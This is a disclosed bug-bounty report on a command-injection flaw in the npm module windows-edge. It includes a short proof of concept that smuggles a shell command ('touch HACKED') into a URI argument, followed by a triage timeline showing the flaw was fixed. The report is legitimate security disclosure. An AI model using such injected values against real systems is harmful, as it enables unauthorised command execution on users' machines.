---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/code-injection
  - env/web
  - stack/node
  - os/windows
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2020-08-24
submitted: 2020-05-19T22:34:12.863Z
bounty_usd: null
votes: 3
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "mik317"
source: "https://hackerone.com/reports/878420"
title: "[windows-edge] RCE via insecure command formatting"
---
# [windows-edge] RCE via insecure command formatting

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 3 | **Program:** Node.js third-party modules | **Disclosed:** 2020-08-24

- Report: [https://hackerone.com/reports/878420](https://hackerone.com/reports/878420)
- CWE: Code Injection
- Submitted: 2020-05-19T22:34:12.863Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a `RCE` issue in the `windows-edge` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `windows-edge`
**version:** `1.0.1`
**npm page:** `https://www.npmjs.com/package/windows-edge`

## Module Description
> Launch a new Microsoft Edge tab on Windows

## Module Stats
[102] downloads in the last week

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/eugeneware/windows-edge/blob/master/index.js#L8

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
const edge = require('windows-edge');
edge({ uri: 'https://github.com/; touch HACKED; #' }, (err, ps) => {})

```
1. Check there aren't files called `HACKED` 
1. Execute the following commands in another terminal:

```bash
npm i windows-edge # Install affected module
node poc.js #  Run the PoC
```
1. Recheck the files: now `HACKED` has been created :) {F835199}

## Patch
> Don't format `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: v12.16.1
- [NPM VERSION]: 6.13.4

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` via command formatting on `windows-edge`

## Timeline

- **Report Filed**
- **2020-05-19** @nochnoidozor: Hi @mik317,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Triaged**
- **2020-07-25** @bbe8482aecd24374d13c5de15a0a6: Hi @mik317,

it seems this is already fixed by the latest release and this commit: https://github.com/eugeneware/windows-edge/commit/20ce41e1111d05533d9b4f6e2da274c13b278e0d

Which seems to be the result of https://github.com/eugeneware/windows-edge/issues/2

So it seems this is already resolved. Can you confirm this?
- **2020-07-25** @mik317: Hi @danielruf :),
I reported initially the issue here, and then on Huntr.
They opened the issue on the original repo and another of our members (`69`) reported a good fix which has been merged inside the original repo :).

Can we then close thus as `Resolved` this report? Will a CVE be assigned or it's a different case from the other issues?

Thanks a lot :),
Mik
- **Report Resolved**
- **Agreed On Going Public**
- **2020-07-26** @mik317: Awesome :),
thanks a lot for your help :)

Cheers,
Mik
- **Report Became Public**
